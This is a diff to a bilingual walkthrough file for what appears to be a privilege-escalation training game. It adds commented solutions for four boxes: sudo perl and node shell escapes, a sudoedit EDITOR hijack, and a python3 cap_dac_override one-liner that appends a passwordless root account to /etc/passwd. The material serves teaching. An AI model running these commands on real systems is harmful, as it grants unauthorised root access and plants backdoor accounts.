@@ -1,5 +1,5 @@
 // walkthrough.js — "Explanation mode" data: a fully worked, commented solution
-// per built-in box (id 1..23). Separate from levels.js on purpose: it never
+// per built-in box (id 1..27). Separate from levels.js on purpose: it never
 // touches win-condition logic or scoring, it's pure pedagogy, togglable at
 // will, and does not consume a hint slot (S-rank is unaffected).
 // Keyed by numeric level id — custom boxes (id >= GAME_CUSTOM.NEXT_ID_BASE)
@@ -261,5 +261,43 @@ window.WALKTHROUGHS = {
         { cmd: '/srv/backups/rootbash', explain: {
             en: 'Run it: a real SUID-root binary, planted through a permission model NFS itself chose to disable.',
             fr: 'On le lance : un vrai binaire SUID-root, planté grâce à un modèle de permissions que NFS lui-même a choisi de désactiver.' } }
+    ],
+    24: [ // sudo perl
+        { cmd: 'sudo -l', explain: {
+            en: 'perl is allowed as root — like python3 or ruby, it\'s a general-purpose interpreter that can shell out on command.',
+            fr: 'perl est autorisé en root — comme python3 ou ruby, c\'est un interpréteur généraliste capable de lancer un shell sur demande.' } },
+        { cmd: "sudo perl -e 'exec \"/bin/sh\";'", explain: {
+            en: 'perl -e runs an inline expression. exec replaces the current (already-root, thanks to sudo) process with /bin/sh — the shell inherits that identity outright.',
+            fr: 'perl -e exécute une expression en ligne. exec remplace le processus courant (déjà root, grâce à sudo) par /bin/sh — le shell hérite directement de cette identité.' } }
+    ],
+    25: [ // sudo node
+        { cmd: 'sudo -l', explain: {
+            en: 'node is allowed as root — same family of risk as any scripting runtime with sudo rights.',
+            fr: 'node est autorisé en root — même famille de risque que n\'importe quel runtime de script avec des droits sudo.' } },
+        { cmd: 'sudo node -e \'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})\'', explain: {
+            en: 'node -e runs an inline script. child_process.spawn() forks /bin/sh as a child of the (root, under sudo) node process, wiring its stdio straight to the terminal.',
+            fr: 'node -e exécute un script en ligne. child_process.spawn() fork /bin/sh comme enfant du processus node (root, sous sudo), en reliant ses flux stdio directement au terminal.' } }
+    ],
+    26: [ // sudoedit EDITOR hijack
+        { cmd: 'sudo -l', explain: {
+            en: 'Only sudoedit /etc/motd is allowed — but note the env_keep line for EDITOR. sudoedit never runs the target file itself as root.',
+            fr: 'Seul sudoedit /etc/motd est autorisé — mais remarque la ligne env_keep pour EDITOR. sudoedit ne lance jamais le fichier cible lui-même en root.' } },
+        { cmd: "echo '#!/bin/sh' > /tmp/pwn.sh && echo 'exec /bin/sh' >> /tmp/pwn.sh && chmod +x /tmp/pwn.sh", explain: {
+            en: 'Write a one-line "editor" that just execs a shell the moment it\'s launched.',
+            fr: 'On écrit un "éditeur" d\'une ligne qui se contente de exec un shell dès qu\'il est lancé.' } },
+        { cmd: 'sudo EDITOR=/tmp/pwn.sh -e /etc/motd', explain: {
+            en: 'sudoedit copies /etc/motd somewhere writable and opens $EDITOR on that copy, as root. Since EDITOR is preserved and points at our script, that script runs as root instead of a real editor.',
+            fr: 'sudoedit copie /etc/motd dans un emplacement modifiable et ouvre $EDITOR sur cette copie, en root. EDITOR étant conservée et pointant vers notre script, c\'est ce script qui s\'exécute en root, pas un vrai éditeur.' } }
+    ],
+    27: [ // cap_dac_override write bypass
+        { cmd: 'getcap -r / 2>/dev/null', explain: {
+            en: 'python3 has cap_dac_override — the write-capable sibling of cap_dac_read_search (seen on another box), which only ever bypasses reads.',
+            fr: 'python3 a cap_dac_override — le pendant capable d\'écrire de cap_dac_read_search (vu sur une autre box), qui ne contourne jamais que la lecture.' } },
+        { cmd: "python3 -c \"open('/etc/passwd','a').write('pwnd::0:0::/root:/bin/bash\\n')\"", explain: {
+            en: '/etc/passwd is root-owned, mode 644 — a normal process can\'t append to it. cap_dac_override makes python3 ignore that check entirely, so the append succeeds and drops a UID-0 line with an empty password field.',
+            fr: '/etc/passwd appartient à root, mode 644 — un processus normal ne peut pas y ajouter de ligne. cap_dac_override fait ignorer cette vérification à python3, donc l\'ajout réussit et dépose une ligne UID 0 avec un champ mot de passe vide.' } },
+        { cmd: 'su pwnd', explain: {
+            en: 'Same passwordless-root trick as box-06/box-20, delivered through a capability instead of a permission or sudo misconfiguration.',
+            fr: 'Même astuce de root sans mot de passe qu\'aux box-06/box-20, livrée via une capability plutôt qu\'une permission ou une mauvaise config sudo.' } }
     ]
 };
